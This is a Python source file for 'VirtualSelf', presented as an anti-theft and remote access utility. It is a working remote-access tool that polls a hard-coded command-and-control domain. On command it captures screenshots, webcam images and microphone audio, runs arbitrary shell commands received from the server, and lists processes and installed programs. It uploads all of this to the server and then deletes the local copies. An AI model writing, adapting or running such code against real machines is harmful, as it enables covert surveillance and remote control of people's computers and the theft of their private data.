import os
import winreg as reg
import time
import urllib.request
import urllib.error
import pyautogui
import requests
import psutil
import rethyxyz.rethyxyz
import cv2
import sounddevice as sd
from scipy.io.wavfile import write
from datetime import datetime
import threading
import sys
from pystray import Icon, Menu, MenuItem
from PIL import Image
from plyer import notification

# TODO: Instead of hard coding C:, find the Windows root dir + user dir dynamically.
# TODO: Remove non-Windows specific code, such as for deriving computer name.

PROGRAM_TITLE = "VirtualSelf"
PROGRAM_DESCRIPTION = "Anti-Theft / Remote Access Utility"
DEFAULT_SIGNAL1 = "remote1.html"
DEFAULT_SIGNAL2 = "remote2.html"
DEFAULT_SIGNAL3 = "remote3.html"
DEFAULT_CNC_DOMAIN = "https://rethy.xyz"
POST_USERNAME = ''
POST_PASSWORD = ''

DEFAULT_REFRESH_INTERVAL = 2
SYSTEM_USER = os.getlogin()
COMPUTER_NAME = os.uname().nodename if hasattr(os, 'uname') else os.getenv('COMPUTERNAME')

RUNNING = False
MAIN_THREAD = None

def Main():
    global RUNNING
    cncDomain = DEFAULT_CNC_DOMAIN.rstrip('/')
    postDomain = f"{cncDomain}/VirtualSelf.php"

    Log(f"{PROGRAM_TITLE}: {PROGRAM_DESCRIPTION}")
    Log("Running using the following configuration information:")
    Log(f"Signal One: {DEFAULT_SIGNAL1}")
    Log(f"Signal Two: {DEFAULT_SIGNAL2}")
    Log(f"Signal Three: {DEFAULT_SIGNAL3}")
    Log(f"Command and Control URL: {cncDomain}")
    Log(f"POST URL: {postDomain}")
    Log(f"Refresh Interval: {DEFAULT_REFRESH_INTERVAL}")

    while RUNNING:
        try:
            siteContent = int(GetSiteContent(f"{cncDomain}/{DEFAULT_SIGNAL1}"))
        except (TypeError, ValueError):
            siteContent = 0
        except Exception as e:
            Log(f"Error getting site content: {e}")
            siteContent = 0

        if siteContent == 1:
            ProcessScreenshot(postDomain)
        elif siteContent == 2:
            ProcessCommand(cncDomain, postDomain)
        elif siteContent == 3:
            ProcessWebcam(postDomain)
        elif siteContent == 4:
            ProcessAudio(5, postDomain)
        elif siteContent == 5:
            ProcessProcesses(postDomain)
            ProcessPrograms(postDomain)

        time.sleep(DEFAULT_REFRESH_INTERVAL)

def ProcessPrograms(postDomain):
    filename = f"C:\\Users\\{SYSTEM_USER}\\installedprograms-{COMPUTER_NAME}-" + Get.ValidFilename(SYSTEM_USER, "txt")
    installedPrograms = []
    registryPaths = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
    ]

    for registryPath in registryPaths:
        try:
            registryKey = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, registryPath)
            for i in range(0, reg.QueryInfoKey(registryKey)[0]):
                subKeyName = reg.EnumKey(registryKey, i)
                subKey = reg.OpenKey(registryKey, subKeyName)
                try:
                    programName = reg.QueryValueEx(subKey, "DisplayName")[0]
                    installedPrograms.append(programName)
                except FileNotFoundError:
                    pass
                finally:
                    subKey.Close()
            registryKey.Close()
        except Exception as e:
            print(f"Failed to read registry path: {registryPath}, error: {e}")

    with open(filename, 'w') as file:
        if installedPrograms:
            file.write("Installed Programs:\n")
            for program in installedPrograms:
                file.write(f"{program}\n")
        else:
            file.write("No installed programs found.")

    UploadFile(filename, postDomain)
    CleanUp(filename)

def ProcessProcesses(postDomain):
    filename = f"C:\\Users\\{SYSTEM_USER}\\processlist-{COMPUTER_NAME}-" + Get.ValidFilename(SYSTEM_USER, "txt")
    processList = []
    for process in psutil.process_iter(['pid', 'name']):
        try:
            processInformation = process.info
            processList.append(processInformation)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    with open(filename, 'w') as file:
        for process in processList:
            file.write(f"PID: {process['pid']}, Name: {process['name']}\n")

    UploadFile(filename, postDomain)
    CleanUp(filename)

def ProcessAudio(duration, postDomain, sample_rate=44100):
    filename = f"C:\\Users\\{SYSTEM_USER}\\audio-{COMPUTER_NAME}-" + Get.ValidFilename(SYSTEM_USER, "wav")
    try:
        if len(sd.query_devices()) == 0:
            Log("No audio input devices found.")
            return

        Log(f"Recording for {duration} seconds...")
        audioData = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2, dtype='int16')
        sd.wait()

        write(filename, sample_rate, audioData)
        Log(f"Recording complete. Audio saved to \"{filename}\"")
    except Exception as e:
        Log(f"An error occurred during audio recording: {e}")

    UploadFile(filename, postDomain)
    CleanUp(filename)

def ProcessWebcam(postDomain):
    filename = f"C:\\Users\\{SYSTEM_USER}\\webcam-{COMPUTER_NAME}-" + Get.ValidFilename(SYSTEM_USER, "png")
    cameraPointer = cv2.VideoCapture(0)

    if not cameraPointer.isOpened():
        Log("Could not open webcam")
        return

    returnData, frame = cameraPointer.read()

    if returnData:
        cv2.imwrite(filename, frame)
        Log(f"Photo saved to {filename}")
    else:
        Log("Failed to capture image")

    cameraPointer.release()

    UploadFile(filename, postDomain)
    CleanUp(filename)

def ProcessScreenshot(postDomain):
    try:
        filename = f"C:\\Users\\{SYSTEM_USER}\\screenshot-{COMPUTER_NAME}-" + Get.ValidFilename(SYSTEM_USER, "png")
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        Log(f"Took screenshot \"{filename}\".")
        UploadFile(filename, postDomain)
        CleanUp(filename)
    except Exception as e:
        Log(f"Error in screenshot process: {e}")

def ProcessCommand(cncDomain, postDomain):
    filename = f"C:\\Users\\{SYSTEM_USER}\\command-{COMPUTER_NAME}-" + Get.ValidFilename(SYSTEM_USER, "txt")
    try:
        command = GetSiteContent(f"{cncDomain}/{DEFAULT_SIGNAL2}") or "dir"
        shell = GetSiteContent(f"{cncDomain}/{DEFAULT_SIGNAL3}") or "cmd"

        if shell not in ["cmd", "powershell", "wsl"]:
            shell = "cmd"
        
        commandOutput = os.popen(command).read().strip()
        Log(f"Executed \"{command}\".")
        WriteStringToFile(commandOutput, filename)
        UploadFile(filename, postDomain)
        CleanUp(filename)
    except Exception as e:
        Log(f"Error in command execution process: {e}")

def GetSiteContent(URL):
    try:
        response = urllib.request.urlopen(URL)
        return response.read().decode("utf-8").strip()
    except urllib.error.URLError as e:
        Log(f"URL error: {e}")
    except Exception as e:
        Log(f"Error fetching site content: {e}")
    return None

def WriteStringToFile(string, filename):
    try:
        with open(filename, "w") as file:
            file.write(string)
    except Exception as e:
        Log(f"Error writing to file: {e}")

def UploadFile(filename, postDomain):
    if not filename:
        return
    try:
        with open(filename, 'rb') as file:
            files = {'file1': file}
            payload = {'username': POST_USERNAME, 'password': POST_PASSWORD}

            response = requests.post(postDomain, files=files, data=payload)
            Log(f"File uploaded to {postDomain}. Response: {response.status_code}")
    except requests.exceptions.ConnectionError:
        Log(f"Connection timed out: {postDomain}.")
    except Exception as e:
        Log(f"Error uploading file: {e}")

def CleanUp(filename):
    attempts = 0
    maxAttempts = 10
    while attempts < maxAttempts:
        try:
            os.remove(filename)
            Log(f"Deleted file \"{filename}\".")
            break
        except FileNotFoundError:
            Log(f"File not found during cleanup: {filename}.")
            break
        except PermissionError:
            attempts += 1
            Log(f"File is in use and cannot be deleted, attempt {attempts}/{maxAttempts}: {filename}.")
            time.sleep(1)
        except Exception as e:
            Log(f"Error cleaning up file: {e}")
            break
    else:
        Log(f"Max attempts reached. Failed to delete file: {filename}")

def Log(message):
    message = f"[{Get.Date()} {Get.Time()}] " + message
    with open(f"C:\\Users\\{SYSTEM_USER}\\VirtualSelf-Log-{Get.Date()}.txt", "a") as filePointer:
        filePointer.write(message + "\n")
    #print(message)

def Notification(title, message, iconPath=None):
    notification.notify(
        title=title,
        message=message,
        app_icon=iconPath,
        timeout=2
    )

class Get:
    @staticmethod
    def Time():
        return datetime.now().strftime("%H:%M:%S")

    @staticmethod
    def Date():
        return datetime.now().strftime("%Y-%m-%d")

    @staticmethod
    def ValidFilename(namePrefix, fileSuffix):
        time = Get.Time().replace(":", "_")
        return f"{time}-{namePrefix}.{fileSuffix}"

def StartVirtualSelf(icon):
    global RUNNING, MAIN_THREAD
    if not RUNNING:
        RUNNING = True
        MAIN_THREAD = threading.Thread(target=Main)
        MAIN_THREAD.start()
        Log("VirtualSelf started.")
        Notification("VirtualSelf", "VirtualSelf started successfully.", "VirtualSelf.ico")
    else:
        Log("VirtualSelf is already running.")

def StopVirtualSelf(icon):
    global RUNNING, MAIN_THREAD
    if RUNNING:
        RUNNING = False
        if MAIN_THREAD:
            MAIN_THREAD.join()
        Log("VirtualSelf stopped.")
        Notification("VirtualSelf", "VirtualSelf stopped successfully.", "VirtualSelf.ico")
    else:
        Log("VirtualSelf is not running.")

def QuitVirtualSelf(icon):
    StopVirtualSelf(icon)
    Log("Quitting VirtualSelf.")
    icon.stop()

if __name__ == "__main__":
    rethyxyz.rethyxyz.show_intro(PROGRAM_TITLE)
    iconImagePath = os.path.join(os.getcwd(), "VirtualSelf.ico")
    iconImage = Image.open(iconImagePath)
    
    menu = Menu(
        MenuItem('Start', StartVirtualSelf),
        MenuItem('Stop', StopVirtualSelf),
        MenuItem('Quit', QuitVirtualSelf)
    )

    icon = Icon(PROGRAM_TITLE, iconImage, menu=menu)

    StartVirtualSelf(icon)

    try:
        icon.run()
    except Exception as e:
        Log(f"An error occurred in the system tray icon: {e}")
        Notification("VirtualSelf", "An error occurred in the system tray icon.", "VirtualSelf.ico")
        sys.exit(1)
